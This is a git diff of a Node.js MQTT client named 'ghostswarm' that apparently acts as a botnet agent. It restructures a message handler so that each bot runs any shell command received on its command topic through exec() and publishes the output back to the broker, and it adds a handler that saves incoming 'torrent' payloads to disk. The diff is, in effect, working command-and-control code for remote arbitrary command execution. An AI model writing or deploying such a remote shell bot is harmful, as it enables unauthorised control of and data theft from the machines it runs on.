@@ -28,32 +28,48 @@ mqttClient.on('connect', () => {
 });
 
 mqttClient.on('message', (topic, message) => {
+
    try {
-      const payload = JSON.parse(message.toString());
-      console.log(`📥 [${botId}] received:`, payload);
+      if (topic == `ghostswarm/${botId}/command`) {
+         const payload = JSON.parse(message.toString());
+         console.log(`📥 [${botId}] received:`, payload);
 
-      const statusTopic = `ghostswarm/${botId}/status`;
+         const statusTopic = `ghostswarm/${botId}/status`;
 
-      // Handle different message types
-      if (payload.type === 'shell' && payload.cmd) {
-         // Execute shell command
-         exec(payload.cmd, (err, stdout, stderr) => {
+         // Handle different message types
+         if (payload.type === 'shell' && payload.cmd) {
+            // Execute shell command
+            exec(payload.cmd, (err, stdout, stderr) => {
+               mqttClient.publish(statusTopic, JSON.stringify({
+                  requestId: payload.requestId,
+                  output: err ? stderr || 'Command failed' : stdout.trim(),
+                  status: err ? 'error' : 'ok',
+                  time: Date.now()
+               }));
+               console.log(`📤 [${botId}] shell command executed and responded`);
+            });
+         } else {
+            // General echo response for non-shell commands
             mqttClient.publish(statusTopic, JSON.stringify({
-               requestId: payload.requestId,
-               output: err ? stderr || 'Command failed' : stdout.trim(),
-               status: err ? 'error' : 'ok',
+               received: payload,
+               status: "ok",
                time: Date.now()
             }));
-            console.log(`📤 [${botId}] shell command executed and responded`);
-         });
-      } else {
-         // General echo response for non-shell commands
-         mqttClient.publish(statusTopic, JSON.stringify({
-            received: payload,
-            status: "ok",
-            time: Date.now()
-         }));
-         console.log(`📤 [${botId}] responded to status`);
+            console.log(`📤 [${botId}] responded to status`);
+         }
+
+      } else if (topic == `ghostswarm/${botId}/download`) {
+         // download torrent 
+         const payload = JSON.parse(message.toString());
+         console.log(`📥 [${botId}] received download request`, payload);
+
+         // save torrent data to file
+         const torrentPath = `torrents/${payload.infoHash}.json`;
+         fs.mkdirSync('torrents', { recursive: true }); // ensure directory exists
+         fs.writeFileSync(torrentPath, JSON.stringify(payload, null, 2));
+         console.log(`📂 [${botId}] saved torrent to ${torrentPath}`);
+
+         // Respond with success
       }
    } catch (err) {
       console.error(`❌ [${botId}] failed to handle message`, err);
